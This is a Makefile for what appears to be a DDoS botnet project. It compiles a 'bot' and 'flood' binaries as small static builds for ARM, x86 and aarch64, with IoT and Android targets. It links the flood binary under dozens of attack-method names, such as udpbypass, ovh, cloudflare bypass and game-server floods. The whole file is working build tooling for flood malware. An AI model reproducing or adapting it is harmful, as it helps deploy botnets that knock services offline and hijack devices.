CXX      ?= g++
CXXFLAGS  = -Os -s -fno-exceptions -fno-rtti -ffunction-sections -fdata-sections -Wl,--gc-sections -pthread -static-libstdc++ -static-libgcc
ZIG       ?= /tmp/zig-linux-x86_64-0.13.0/zig

METHODS = dns udp ldap ssdp home udpbypass tcp socket ovh tcpmix tcpbypass ack \
          game rainbow rocket roblox fivem pubg fortnite warthunder counter samp \
          subnet icmp http https httpx rapidflood tls tlsx bypass browser cache cloudflare

all: bot http flood multiarch symlinks

bot: bot.cpp
	@if [ -x "$(ZIG)" ]; then \
		$(ZIG) cc -target x86_64-linux-musl -mcpu=x86_64 -static -Os -s bot.cpp -o bot; \
	else \
		$(CXX) $(CXXFLAGS) -march=x86-64 -mtune=generic -static -o bot bot.cpp; \
	fi

http: http.cpp
	@if [ -x "$(ZIG)" ]; then \
		$(ZIG) c++ -target x86_64-linux-musl -mcpu=x86_64 -static -Os -s -fno-exceptions -fno-rtti http.cpp -o http; \
	else \
		$(CXX) $(CXXFLAGS) -march=x86-64 -mtune=generic -static -o http http.cpp; \
	fi

https: https.cpp
	@if [ -x "$(ZIG)" ]; then \
		ln -sf flood https; \
	else \
		$(CXX) $(CXXFLAGS) -march=x86-64 -mtune=generic -static-libstdc++ -static-libgcc -o https https.cpp -lssl -lcrypto; \
	fi

flood: flood.cpp
	@if [ -x "$(ZIG)" ]; then \
		$(ZIG) c++ -target x86_64-linux-musl -mcpu=x86_64 -static -Os -s -fno-exceptions -fno-rtti -pthread -DNO_SSL flood.cpp -o flood; \
	else \
		$(CXX) $(CXXFLAGS) -march=x86-64 -mtune=generic -static -DNO_SSL -o flood flood.cpp; \
	fi

multiarch:
	@if [ -x "$(ZIG)" ]; then \
		echo "[*] Building multi-arch static binaries with Zig..."; \
		$(ZIG) cc -target aarch64-linux-musl -static -Os -s bot.cpp -o bot-aarch64; \
		$(ZIG) cc -target arm-linux-musleabi -static -Os -s bot.cpp -o bot-armv7l; \
		$(ZIG) cc -target x86_64-linux-musl -static -Os -s bot.cpp -o bot-x86_64; \
		$(ZIG) cc -target x86-linux-musl -static -Os -s bot.cpp -o bot-x86; \
		$(ZIG) c++ -target aarch64-linux-musl -static -Os -s -fno-exceptions -fno-rtti http.cpp -o http-aarch64; \
		$(ZIG) c++ -target arm-linux-musleabihf -mcpu=cortex_a7 -static -Os -s -fno-exceptions -fno-rtti http.cpp -o http-armv7l; \
		$(ZIG) c++ -target x86_64-linux-musl -static -Os -s -fno-exceptions -fno-rtti http.cpp -o http-x86_64; \
		$(ZIG) c++ -target x86-linux-musl -static -Os -s -fno-exceptions -fno-rtti http.cpp -o http-x86; \
		$(ZIG) c++ -target aarch64-linux-musl -static -Os -s -fno-exceptions -fno-rtti -pthread -DNO_SSL flood.cpp -o flood-aarch64; \
		$(ZIG) c++ -target arm-linux-musleabihf -mcpu=cortex_a7 -static -Os -s -fno-exceptions -fno-rtti -pthread -DNO_SSL flood.cpp -o flood-armv7l; \
		$(ZIG) c++ -target x86_64-linux-musl -static -Os -s -fno-exceptions -fno-rtti -pthread -DNO_SSL flood.cpp -o flood-x86_64; \
		$(ZIG) c++ -target x86-linux-musl -static -Os -s -fno-exceptions -fno-rtti -pthread -DNO_SSL flood.cpp -o flood-x86; \
		echo "[+] Multi-arch static binaries built successfully."; \
	fi

iot: bot http
	$(CXX) $(CXXFLAGS) -DNO_SSL -static -o flood flood.cpp
	@for m in $(METHODS); do \
		ln -sf flood $$m; \
	done

android: bot http https flood symlinks

symlinks: flood
	@for m in $(METHODS); do \
		ln -sf flood $$m; \
	done

clean:
	rm -f bot http https flood bot-* http-* flood-* $(METHODS)
